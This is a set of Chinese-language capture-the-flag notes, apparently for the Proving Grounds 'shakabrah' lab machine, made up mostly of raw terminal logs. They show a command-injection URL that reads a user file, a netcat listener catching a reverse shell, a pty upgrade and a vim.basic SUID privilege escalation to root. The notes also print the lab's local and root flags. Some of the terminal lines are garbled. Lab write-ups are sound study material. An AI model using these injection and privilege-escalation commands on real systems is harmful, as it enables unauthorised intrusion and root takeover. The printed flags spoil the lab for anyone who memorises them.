262ebce0f71735881814778fb0c48096
 
参考资料  
[https://tanishq.page/blog/posts/oscp-pg-set7/](https://tanishq.page/blog/posts/oscp-pg-set7/) 直接使用这个进行提权
   

hoami  
www-data  
$ ./vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'  
./vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'  
sh: 14: ./vim.basic: not found  
$ ./vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'  
./vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'  
sh: 15: ./vim.basic: not found  
$
       
第一个flag  
poc  
[http://192.168.172.86/?host=127.0.0.1;cat%20/home/dylan/local.txt](http://192.168.172.86/?host=127.0.0.1;cat%20/home/dylan/local.txt)
      

解题2：  
└─$ nc -lnvp 80  
listening on [any] 80 ...  
connect to [192.168.45.209] from (UNKNOWN) [192.168.172.86] 56242  
$ id  
id  
uid=33(www-data) gid=33(www-data) groups=33(www-data)  
$ python3 -c 'import pty;pty.spawn("/bin/bash")'  
python3 -c 'import pty;pty.spawn("/bin/bash")'  
www-data@shakabrah:/var/www/html$ pwd  
pwd  
/var/www/html  
www-data@shakabrah:/var/www/html$ cd  
cd  
bash: cd: HOME not set  
www-data@shakabrah:/var/www/html$ ls  
ls  
index.php  
www-data@shakabrah:/var/www/html$ cd /home  
cd /homel  
www-data@shakabrah:/home$ s  
ls  
dylan  
www-data@shakabrah:/home$ cd dylan  
cd dylan  
www-data@shakabrah:/home/dylan$ ls  
lsc  
local.txt  
www-data@shakabrah:/home/dylan$ at local.txt  
cat local.txt  
262ebce0f71735881814778fb0c48096  
www-data@shakabrah:/home/dylan$
 
==提权多回车几次==  
[https://medium.com/@Inching-Towards-Intelligence/pg-play-shakabrah-57-100-5c377da592](https://medium.com/@Inching-Towards-Intelligence/pg-play-shakabrah-57-100-5c377da592)
   

listening on [any] 80 ...  
connect to [192.168.45.209] from (UNKNOWN) [192.168.172.86] 56258  
$ sudo install -m =xs $(which vim) .  
sudo install -m =xs $(which vim) .  
[sudo] password for www-data:
             
Sorry, try again.  
[sudo] password for www-data:  
Sorry, try again.  
[sudo] password for www-data:
       
sudo: 3 incorrect password attempts  
E79: Cannot expand wildcards
 
E79: Cannot expand wildcardss.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'  
./vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'  
E79: Cannot expand wildcards  
$ ./vi -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'  
E79: Cannot expand wildcardsxecl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'  
sh: 6: ./vi: not found  
E79: Cannot expand wildcardsos; os.setuid(0); os.system("/bin/bash")'  
vim.basic -c ':py3 import os; os.setuid(0); os.system("/bin/bash")'  
E79: Cannot expand wildcards  
E79: Cannot expand wildcards 多回车几次  
E79: Cannot expand wildcards   root@shakabrah:/var/www/html# whoami  
root  
root@shakabrah:/var/www/html# cd  
bash: cd: HOME not set  
root@shakabrah:/var/www/html# cd /  
root@shakabrah:/# cd /root  
root@shakabrah:/root# ;s  
bash: syntax error near unexpected token `;'  
root@shakabrah:/root# ls  
proof.txt  
root@shakabrah:/root# cat proof.txt  
2a55c6f5ab32186954d42c995becb61d  
root@shakabrah:/root#